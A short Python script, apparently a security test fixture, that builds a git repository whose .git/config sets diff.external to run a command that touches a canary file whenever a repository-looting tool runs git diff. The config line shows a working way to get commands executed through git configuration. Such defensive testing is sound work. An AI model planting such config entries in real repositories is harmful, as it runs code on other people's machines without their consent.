"""A4: malicious diff.external in .git/config.

Fires only when the pillager runs ``git diff`` (rare). Included for
coverage of the configurable-command attack surface.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402


def main() -> None:
    build_minimal_repo(
        HERE / 'payload',
        config=config_with('[diff]\n\texternal = "touch /canary/PWNED_A4; true"\n'),
    )
    print(f'Built A4 payload at {HERE / "payload"}')


if __name__ == '__main__':
    main()
